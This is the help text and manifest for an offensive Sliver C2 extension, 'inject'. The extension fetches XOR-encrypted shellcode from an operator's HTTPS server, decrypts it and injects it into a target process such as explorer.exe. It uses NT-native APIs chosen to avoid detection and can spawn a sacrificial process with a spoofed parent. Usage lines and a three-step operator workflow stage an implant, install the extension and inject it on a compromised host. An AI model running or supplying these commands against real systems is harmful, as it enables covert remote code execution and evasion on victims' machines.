name: inject
help:
Inject shellcode into a remote process with optional PPID spoofing. Fetches an XOR-encrypted shellcode payload from the operator's HTTPS server, decrypts it, and injects it into a target process via NT-native APIs (no RWX, no kernel32 VirtualAlloc).

Usage — inject into existing process:
  inject url=<https://...> key=<64 hex chars> target=<process.exe>

Usage — spawn a sacrificial process with spoofed parent, inject into it:
  inject url=<https://...> key=<64 hex chars> spawn=<process.exe> ppid=<parent.exe>

Examples:
  inject url=https://192.168.1.10:8443/abc key=<key> target=explorer.exe
  inject url=https://192.168.1.10:8443/abc key=<key> spawn=RuntimeBroker.exe ppid=explorer.exe

Operator workflow:
  1. injectkit stage --shellcode implant.bin --url https://192.168.1.10:8443/abc --serve
  2. sliver> extensions install build/inject-0.1.0.tar.gz
  3. sliver (TARGET)> inject url=https://192.168.1.10:8443/abc key=<key> target=explorer.exe

commands.name: inject
commands.help: Inject shellcode into a remote process (existing or spawned with PPID spoof) via NT-native APIs
